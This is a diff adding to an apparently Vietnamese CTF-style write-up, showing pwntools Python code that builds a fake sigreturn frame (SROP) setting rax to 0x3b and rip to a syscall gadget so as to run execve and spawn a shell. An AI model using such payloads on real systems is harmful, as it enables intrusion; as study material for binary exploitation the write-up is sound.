@@ -29,3 +29,31 @@ frame.rdx= 0x1000
 <img width="815" height="546" alt="image" src="https://github.com/user-attachments/assets/39764277-3276-4740-9671-ef53e35a9d52" />
 
 tiếp tục đưa 0x0f vào rax và dùng frame
+```python
+payload += p64(0)  
+payload += p64(0)  
+payload += p64(0)  
+payload += p64(0)  
+payload += p64(0)  #r8
+payload += p64(0)  #r9
+payload += p64(0)  #r10
+payload += p64(0)  #r11
+payload += p64(0)  #r12
+payload += p64(0)  #r13
+payload += p64(0)  #r14
+payload += p64(0)  #r15
+payload += p64(0x601038) #rdi
+payload += p64(0)        #rsi
+payload += p64(0x601028) #rbp 
+payload += p64(0)        #rbx
+payload += p64(0)        #rdx
+payload += p64(0x3b)     #rax 
+payload += p64(0)        #rcx
+payload += p64(0x601028) #rsp
+payload += p64(syscall)  #rip
+payload += p64(0)        #eflags
+payload += p16(0x33)     #cs
+payload += p16(0)        #gs
+payload += p16(0)        #fs
+payload += p16(0x2b)     #ss
+```
